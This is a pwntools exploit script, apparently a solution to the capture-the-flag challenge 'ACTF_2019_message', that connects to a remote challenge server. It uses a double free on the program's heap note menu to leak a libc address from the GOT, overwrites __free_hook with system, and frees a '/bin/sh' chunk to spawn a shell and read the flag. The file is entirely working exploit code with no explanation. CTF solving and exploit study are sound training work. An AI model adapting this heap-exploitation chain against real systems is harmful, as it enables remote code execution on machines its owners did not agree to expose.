# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './ACTF_2019_message'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28311'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('your choice: ',num)

def add(size ,message = 'a' ):
    cmd(1)
    sla('length of message:' , size)
    sa('message:' , message)

def delete(idx):
    cmd(2)
    sla(' delete:' , idx)

def edit( idx , message ):
    cmd(3)
    sla('edit:' , idx)
    sa('message:' , message)

def show(idx):
    cmd(4)
    sla('display:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    ptr_list = 0x602060
    free_got = 0x601F90
    add(0x88)
    add(0x28)
    
    delete(0)
    delete(0)
    add(0x88 , p64(0x602060))
    add(0x88 )
    payload = flat(
        0x8 , free_got
    )

    add(0x88 , payload)
    show(0)
    leak = l64()
    lg('leak' , leak)
    
    libc.address = leak - libc.sym['free']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']

    edit(4 , flat( 0x10 , __free_hook-8 ))
    edit(0 , flat( '/bin/sh\x00' , system_addr ))
    delete(0)
    # dbg()

    ''

attack()
p.success(getShell())
p.interactive()

'''
@File    :   ACTF_2019_message.py
@Time    :   2021/10/28 23:38:49
@Author  :   Niyah 
'''